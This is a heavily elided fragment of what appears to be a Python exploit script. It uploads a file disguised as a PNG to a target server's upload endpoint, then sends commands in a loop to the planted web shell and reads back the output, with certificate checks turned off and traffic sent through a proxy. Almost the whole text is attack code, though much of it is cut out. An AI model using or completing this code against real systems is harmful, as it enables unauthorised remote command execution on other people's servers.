...
def webshell(SERVER_URL, session):
    try:
        ...
        r2 = session.get(WEB_SHELL, params=getdir, verify=False, proxies=PROXY)
        ...
        while True:
            ...
            r2 = requests.get(WEB_SHELL, params=command, verify=False, proxies=PROXY)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
...
if __name__ == "__main__":
    ...
    s = requests.Session()
    s.get(SERVER_URL, verify=False, proxies=PROXY)
    ...
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False, proxies=PROXY)
